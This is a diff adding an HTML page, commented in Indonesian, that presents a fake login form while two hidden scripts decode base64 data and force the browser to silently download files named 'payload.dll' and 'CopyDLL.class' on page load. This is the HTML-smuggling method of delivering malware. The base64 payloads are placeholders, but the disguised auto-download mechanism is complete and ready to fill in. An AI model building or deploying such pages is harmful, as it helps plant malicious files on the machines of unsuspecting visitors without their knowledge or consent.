@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>File Downloader & Login Page</title>
+    <style>
+        /* Desain dasar untuk halaman login */
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f4f4f9;
+        }
+
+        .login-container {
+            width: 300px;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            background-color: #ffffff;
+            text-align: center;
+        }
+
+        .login-container h2 {
+            margin: 0 0 20px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 10px;
+            background-color: #007bff;
+            border: none;
+            color: white;
+            font-size: 16px;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        .login-btn:hover {
+            background-color: #0056b3;
+        }
+    </style>
+</head>
+<body>
+
+<div class="login-container">
+    <h2>Login</h2>
+    <input type="text" class="input-field" placeholder="Username" required>
+    <input type="password" class="input-field" placeholder="Password" required>
+    <button class="login-btn">Login</button>
+</div>
+
+<!-- Seksi untuk skrip pengunduhan file menggunakan base64 -->
+<script>
+    // Fungsi ini mengonversi string base64 ke ArrayBuffer untuk digunakan dalam pembuatan file
+    function base64ToArrayBuffer(base64) {
+        // Dekode string base64 menjadi string biner
+        var binary_string = window.atob(base64);
+        var len = binary_string.length;
+        var bytes = new Uint8Array(len);
+        // Iterasi setiap karakter untuk mengonversi menjadi data byte
+        for (var i = 0; i < len; i++) {
+            bytes[i] = binary_string.charCodeAt(i);
+        }
+        // Mengembalikan buffer byte yang dapat digunakan sebagai file
+        return bytes.buffer;
+    }
+
+    // Variabel file dalam base64 - ganti dengan string base64 sebenarnya dari file yang diinginkan
+    var file = 'Your base64 string here';
+    // Mengonversi file base64 ke ArrayBuffer
+    var data = base64ToArrayBuffer(file);
+    // Membuat objek Blob dari ArrayBuffer yang dikonversi, dengan tipe octet/stream
+    var blob = new Blob([data], {type: 'octet/stream'});
+
+    // Menyiapkan atribut file, misalnya 'payload.dll'
+    var fileName = 'payload.dll';
+    // Membuat elemen 'a' untuk mengunduh file
+    var a = document.createElement('a');
+    document.body.appendChild(a);
+    a.style = 'display: none;'; // Sembunyikan elemen dari tampilan pengguna
+    // Membuat URL untuk Blob yang dibuat
+    var url = window.URL.createObjectURL(blob);
+    a.href = url;
+    a.download = fileName; // Tetapkan nama file unduhan
+    a.click(); // Simulasikan klik untuk memulai unduhan
+    // Menghapus URL Blob setelah unduhan selesai
+    window.URL.revokeObjectURL(url);
+</script>
+
+<script>
+    // Fungsi ini untuk mengunduh file lain dengan nama dan format berbeda
+    function base64ToArrayBuffer(base64) {
+        var binary_string = window.atob(base64);
+        var len = binary_string.length;
+        var bytes = new Uint8Array(len);
+        for (var i = 0; i < len; i++) {
+            bytes[i] = binary_string.charCodeAt(i);
+        }
+        return bytes.buffer;
+    }
+
+    var file = 'Your base64 string here';
+    var data = base64ToArrayBuffer(file);
+    var blob = new Blob([data], {type: 'octet/stream'});
+
+    // Nama file kedua, misalnya 'CopyDLL.class'
+    var fileName = 'CopyDLL.class';
+    var a = document.createElement('a');
+    document.body.appendChild(a);
+    a.style = 'display: none;';
+    var url = window.URL.createObjectURL(blob);
+    a.href = url;
+    a.download = fileName;
+    a.click();
+    window.URL.revokeObjectURL(url);
+</script>
+
+</body>
+</html>
